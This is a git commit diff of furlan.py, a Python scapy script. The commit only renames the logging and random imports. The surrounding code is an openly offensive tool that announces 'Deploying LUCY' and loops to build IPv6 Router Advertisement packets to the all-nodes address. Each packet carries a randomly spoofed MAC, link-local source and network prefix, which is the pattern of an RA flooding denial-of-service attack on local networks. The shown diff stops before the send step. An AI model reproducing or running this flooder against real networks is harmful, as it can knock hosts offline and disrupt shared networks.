c9e982bb4043c008eb18f6f00c30567a3720308f
Akuto Sai <36693722+AkutoSai@users.noreply.github.com>
2021-10-04 13:15:35 +0530

    Update furlan.py

--- furlan.py
+++ furlan.py
@@ -1,9 +1,9 @@
-import logging
+import logging as  log
 from scapy.all import *
 import sys
-import random
+import random as rand
 
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+log.getLogger("scapy.runtime").setLevel(log.ERROR)
 
 """                             
 print( ▄▄▄       ██ ▄█▀ █    ██ ▄▄▄█████▓ ▒█████       ██████  ▄▄▄       ██▓)
@@ -25,9 +25,9 @@ try:
 	print "\nDeploying LUCY. Let's DANCE!!! "
 
 	while a > 0:
-	    mac = "aa:11:" + ":".join(("%02x" % random.randint(0, 255) for i in range(4)))
-	    ipv6 = "fe80::218:" + ":".join(("%x" % random.randint(0, 16**4) for i in range(3)))
-	    prefix1 = "2a01:" + ":".join(("%x" % random.randint(0, 16**4) for i in range(3))) + "::"
+	    mac = "aa:11:" + ":".join(("%02x" % rand.randint(0, 255) for i in range(4)))
+	    ipv6 = "fe80::218:" + ":".join(("%x" % rand.randint(0, 16**4) for i in range(3)))
+	    prefix1 = "2a01:" + ":".join(("%x" % rand.randint(0, 16**4) for i in range(3))) + "::"
 
 	    try:
 		packet = IPv6(src = ipv6, dst = "ff02::1")/ICMPv6ND_RA(chlim = 255, routerlifetime = 65535, reachabletime= 16384000,retranstimer= 1966080)/ICMPv6NDOptMTU(mtu = 1500)/ICMPv6NDOptPrefixInfo(prefixlen = 64, L=1, A=1, R=1, res1=0,prefix = prefix1 )/ICMPv6NDOptSrcLLAddr(lladdr = mac)
